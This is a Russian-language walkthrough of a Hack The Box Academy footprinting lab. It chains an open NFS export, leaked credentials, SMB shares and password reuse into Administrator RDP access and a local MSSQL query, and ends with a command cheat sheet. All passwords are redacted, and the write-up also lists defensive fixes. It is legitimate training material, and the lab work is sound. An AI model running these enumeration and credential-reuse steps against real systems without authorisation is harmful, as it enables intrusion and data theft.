# Hack The Box Academy — Footprinting Lab: Medium

> **Платформа:** Hack The Box Academy  
> **Модуль:** Footprinting  
> **Сложность:** Medium  
> **Цель:** `10.129.202.41`  
> **Hostname:** `WINMEDIUM`  
> **Дата:** 2 октября 2026  

---

## 1. Цель лаборатории

Провести перечисление доступных сетевых служб на целевой системе, найти возможные точки входа и последовательно использовать полученную информацию для дальнейшего доступа к системе.

Финальная задача — обнаружить учётную запись `HTB` и получить связанный с ней пароль.

---

## 2. Краткий attack path

```text
TCP Enumeration
        ↓
NFS /TechSupport
        ↓
Учётные данные alex
        ↓
SMB devshare
        ↓
Файл important.txt
        ↓
Пароль, связанный с sa
        ↓
Password Reuse
        ↓
Windows Administrator
        ↓
RDP
        ↓
Локальный SSMS / MSSQL
        ↓
accounts.dbo.devsacc
        ↓
Запись HTB
```

---

## 3. Initial Reconnaissance

### 3.1 Полный TCP-скан

Первым шагом был выполнен полный SYN-скан всех TCP-портов:

```bash
sudo nmap -sS -p- 10.129.202.41
```

### Результат

```text
111/tcp   open  rpcbind
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
445/tcp   open  microsoft-ds
2049/tcp  open  nfs
3389/tcp  open  ms-wbt-server
5985/tcp  open  wsman
47001/tcp open  winrm
49664/tcp open  unknown
49665/tcp open  unknown
49666/tcp open  unknown
49667/tcp open  unknown
49668/tcp open  unknown
49679/tcp open  unknown
49680/tcp open  unknown
49681/tcp open  unknown
```

### Анализ

На цели были доступны несколько Windows-служб и сетевых протоколов:

- `111/tcp` и `2049/tcp` — RPC/NFS;
- `139/tcp` и `445/tcp` — SMB;
- `3389/tcp` — RDP;
- `5985/tcp` и `47001/tcp` — WinRM.

Порта `1433/tcp` в результатах не было, поэтому MSSQL не был доступен напрямую с Pwnbox. Позднее выяснилось, что SQL Server работал локально на самой Windows-машине.

---

## 4. NFS Enumeration

### 4.1 Поиск экспортов

Наличие `rpcbind` и NFS на `2049/tcp` указывало на необходимость проверить экспортированные каталоги:

```bash
showmount -e 10.129.202.41
```

### Результат

```text
Export list for 10.129.202.41:
/TechSupport (everyone)
```

### Анализ

Экспорт `/TechSupport` был доступен всем клиентам, поэтому его стоило смонтировать и проверить содержимое.

---

### 4.2 Монтирование NFS

```bash
sudo mkdir -p /tmp/lab
sudo mount -t nfs 10.129.202.41:/TechSupport /tmp/lab -o nolock
```

Внутри находилось множество файлов технической поддержки. Чтобы не открывать каждый файл вручную, были найдены непустые файлы:

```bash
find /tmp/lab -type f -size +0c -ls
```

### Результат

Интересующим файлом оказался:

```text
ticket4238791283782.txt
```

Файл был прочитан:

```bash
sudo cat /tmp/lab/ticket4238791283782.txt
```

В тикете присутствовала конфигурация приложения, содержащая:

```text
host=smtp.web.dev.inlanefreight.htb
user="alex"
password="<REDACTED>"
```

### Результат

| Данные | Значение |
|---|---|
| Пользователь | `alex` |
| Пароль | `<REDACTED>` |
| SMTP hostname | `smtp.web.dev.inlanefreight.htb` |

### Анализ

NFS раскрыл рабочие учётные данные пользователя `alex` и имя отдельного SMTP-узла. Эти данные можно было проверить на уже обнаруженных сервисах текущей цели.

---

## 5. Проверка почтового направления

Поскольку в конфигурации присутствовал SMTP-hostname, были проверены стандартные почтовые порты на текущем IP:

```bash
nmap -sV -p25,110,143,465,587,993,995 10.129.202.41
```

### Результат

```text
25/tcp  closed smtp
110/tcp closed pop3
143/tcp closed imap
465/tcp closed smtps
587/tcp closed submission
993/tcp closed imaps
995/tcp closed pop3s
```

Дополнительные попытки подключения также завершились отказом:

```bash
telnet 10.129.202.41 25
telnet 10.129.202.41 587
nc -nv 10.129.202.41 587
```

### Анализ

Hostname `smtp.web.dev.inlanefreight.htb` относился к отдельному узлу. Продолжать исследование почтовых протоколов на `10.129.202.41` не имело смысла.

Этот отрицательный результат помог не тратить время на неправильное направление.

---

## 6. SMB Enumeration

### 6.1 Проверка SMB

```bash
nmap -p139,445 -sC -sV 10.129.202.41
```

### Результат

```text
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds

smb2-security-mode:
  3:1:1:
    Message signing enabled but not required
```

### Анализ

SMB signing был включён, но не являлся обязательным. Это само по себе не означало наличие анонимного доступа, поэтому сначала была проверена null-сессия.

---

### 6.2 Анонимное перечисление

```bash
smbclient -L //10.129.202.41 -N
```

### Результат

```text
session setup failed: NT_STATUS_ACCESS_DENIED
```

### Анализ

Анонимный доступ был запрещещён, поэтому были использованы найденные в NFS данные пользователя `alex`.

---

### 6.3 Перечисление с учётными данными alex

```bash
smbclient -L //10.129.202.41 -U alex
```

### Результат

```text
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
devshare        Disk
IPC$            IPC       Remote IPC
Users           Disk
```

Интерес представлял обычный файловый ресурс:

```text
devshare
```

Подключение:

```bash
smbclient //10.129.202.41/devshare -U alex
```

Внутри был найден файл:

```text
important.txt
```

Его можно было скачать:

```text
smb: \> get important.txt
```

### Результат

Содержимое файла:

```text
sa:<REDACTED>
```

### Анализ

Имя `sa` выглядело как SQL Server login. На этом этапе было важно не путать SQL-login с Windows account: наличие пары `sa:password` ещё не означало возможность использовать пользователя `sa` для RDP или WinRM.

---

## 7. RDP и Windows Authentication

### 7.1 Перечисление RDP

```bash
nmap -sV -sC --script 'rdp*' -p3389 10.129.202.41
```

### Результат

```text
3389/tcp open  ms-wbt-server Microsoft Terminal Services

rdp-enum-encryption:
  Security layer
    CredSSP (NLA): SUCCESS
    CredSSP with Early User Auth: SUCCESS
    RDSTLS: SUCCESS

rdp-ntlm-info:
  Target_Name: WINMEDIUM
  NetBIOS_Domain_Name: WINMEDIUM
  NetBIOS_Computer_Name: WINMEDIUM
  DNS_Domain_Name: WINMEDIUM
  DNS_Computer_Name: WINMEDIUM
  Product_Version: 10.0.17763
```

### Результат

| Данные | Значение |
|---|---|
| Hostname | `WINMEDIUM` |
| Windows version | `10.0.17763` |
| Authentication | NLA / CredSSP |

---

### 7.2 Неудачная попытка входа как sa

Была проверена возможность использовать найденные данные как Windows-учётную запись:

```bash
xfreerdp /u:sa /p:'<REDACTED>' /v:10.129.202.41
```

### Результат

```text
ERRCONNECT_LOGON_FAILURE
```

WinRM также не принял эту учётную запись:

```bash
nxc winrm 10.129.202.41 -u sa -p '<REDACTED>'
```

### Анализ

`sa` — SQL Server login, а RDP и WinRM проверяют Windows accounts. Это был важный момент разделения разных типов учётных записей.

---

### 7.3 Проверка alex по RDP

Данные из NFS были также проверены по RDP:

```bash
xfreerdp /u:alex /p:'<REDACTED>' /v:10.129.202.41
```

Клиент успешно дошёл до создания графического сеанса, после чего соединение было завершено сервером:

```text
ERRINFO_RPC_INITIATED_DISCONNECT:
The disconnection was initiated by an administrative tool on the server in another session.
```

### Анализ

Ошибка указывала не на неверный пароль, а на принудительное завершение уже созданного RDP-сеанса сервером.

---

### 7.4 Password reuse для Administrator

Пароль из `important.txt` был проверен для локальной Windows-учётной записи `Administrator`:

```bash
xfreerdp \
  /v:10.129.202.41 \
  /u:Administrator \
  /p:'<REDACTED>' \
  /cert:ignore
```

### Результат

RDP-подключение состоялось.

### Анализ

Это подтвердило повторное использование одного пароля между данными, найденными в SMB-файле, и локальной административной учётной записью Windows.

Таким образом был получен административный графический доступ к системе.

---

## 8. Local MSSQL / SSMS

В RDP-сеансе был запущен **Microsoft SQL Server Management Studio (SSMS)** от имени администратора.

Подключение к локальному SQL Server выполнялось с использованием:

```text
Windows Authentication
```

### Анализ

При Windows Authentication SSMS использует Windows-токен текущего пользователя. Поэтому отдельно вводить SQL-login `sa` не требовалось.

Хотя `1433/tcp` не был доступен извне, SQL Server работал локально на Windows-хосте. Это показало важное различие между:

```text
сервис не доступен удалённо
```

и

```text
сервис вообще отсутствует
```

---

### 8.1 Enumeration через Object Explorer

В SSMS был найден следующий путь:

```text
Databases
└── accounts
    └── Tables
        └── dbo.devsacc
            └── Columns
                ├── id
                ├── name
                └── password
```

### Результат

| Объект | Значение |
|---|---|
| Database | `accounts` |
| Schema | `dbo` |
| Table | `devsacc` |
| Columns | `id`, `name`, `password` |

### Анализ

Структура таблицы показывала, что целевая информация могла находиться в `accounts.dbo.devsacc`.

---

## 9. Получение записи HTB

Вместо вывода всей таблицы был сформирован точечный запрос:

```sql
SELECT TOP (1000)
    [id],
    [name],
    [password]
FROM [accounts].[dbo].[devsacc]
WHERE [name] = 'HTB';
```

### Результат

```text
id   name   password
157  HTB    <REDACTED>
```

Цель лаборатории была достигнута.

---

## 10. Findings Summary

| Этап | Находка | Значение |
|---|---|---|
| TCP Enumeration | NFS, SMB, RDP, WinRM | Определены основные направления enumeration |
| NFS | Экспорт `/TechSupport` | Получен доступ к тикетам поддержки |
| NFS ticket | Credentials `alex` | Найдены рабочие учётные данные |
| Mail check | Почтовые порты закрыты | SMTP-hostname оказался отдельным узлом |
| SMB | `devshare` | Найден дополнительный файловый ресурс |
| `important.txt` | `sa:<REDACTED>` | Получен новый пароль и SQL-контекст |
| RDP / WinRM | `sa` не является Windows account | Разделены SQL login и Windows account |
| Password reuse | Пароль подошёл `Administrator` | Получен административный RDP-доступ |
| Local SSMS | База `accounts` | Найден локальный MSSQL |
| MSSQL | `accounts.dbo.devsacc` | Найдена целевая запись `HTB` |

---

## 11. Key Lessons

Ключевая сложность лаборатории заключалась в связывании информации между разными службами.

Главные практические выводы:

- NFS может раскрывать чувствительные файлы и конфигурации;
- hostname из конфигурации не доказывает, что сервис расположен на текущем IP;
- отрицательные результаты тоже важны и помогают отбрасывать неверные направления;
- SMB credentials могут открыть дополнительные ресурсы, недоступные анонимно;
- SQL Server login и Windows account — разные типы сущностей;
- найденный пароль может оказаться повторно использованным другой учётной записью;
- отсутствие внешнего `1433/tcp` не означает отсутствие локального MSSQL;
- Windows Authentication позволяет SSMS использовать токен текущего Windows-пользователя;
- целевые SQL-запросы лучше полного `SELECT *`, когда известно, какую запись нужно найти.

---

## 12. Security Takeaways

Вся цепочка стала возможной из-за нескольких проблем конфигурации и управления секретами:

- NFS-экспорт `/TechSupport` был доступен слишком широко;
- конфигурация приложения содержала plaintext credentials;
- SMB-файл содержал ещё один пароль в открытом виде;
- пароль был повторно использован для локального `Administrator`;
- административная Windows-учётная запись имела доступ к локальной базе данных;
- таблица содержала пользовательские пароли в читаемом виде;
- SMB signing был включён, но не являлся обязательным.

Для снижения риска следует применять минимальные права, ограничивать NFS и SMB, использовать уникальные административные пароли, хранить секреты в защищённых хранилищах и разделять привилегии ОС и СУБД.

---

## 13. Command Cheat Sheet

| Задача | Команда |
|---|---|
| Полный TCP-скан | `sudo nmap -sS -p- <TARGET>` |
| NFS exports | `showmount -e <TARGET>` |
| Mount NFS | `sudo mount -t nfs <TARGET>:/EXPORT /mnt/point -o nolock` |
| Найти непустые файлы | `find /mnt/point -type f -size +0c -ls` |
| Проверить SMB | `nmap -p139,445 -sC -sV <TARGET>` |
| Anonymous SMB listing | `smbclient -L //<TARGET> -N` |
| Authenticated SMB listing | `smbclient -L //<TARGET> -U <USER>` |
| SMB share | `smbclient //<TARGET>/<SHARE> -U <USER>` |
| RDP enumeration | `nmap -sV -sC --script 'rdp*' -p3389 <TARGET>` |
| RDP login | `xfreerdp /v:<TARGET> /u:<USER> /p:'<PASSWORD>' /cert:ignore` |
| WinRM credential check | `nxc winrm <TARGET> -u <USER> -p '<PASSWORD>'` |

---

## 14. Final Attack Path

```text
NFS /TechSupport
      ↓
Leaked alex credentials
      ↓
SMB devshare
      ↓
important.txt
      ↓
Password reuse
      ↓
Windows Administrator
      ↓
RDP
      ↓
Local SSMS / MSSQL
      ↓
accounts.dbo.devsacc
      ↓
HTB record
```
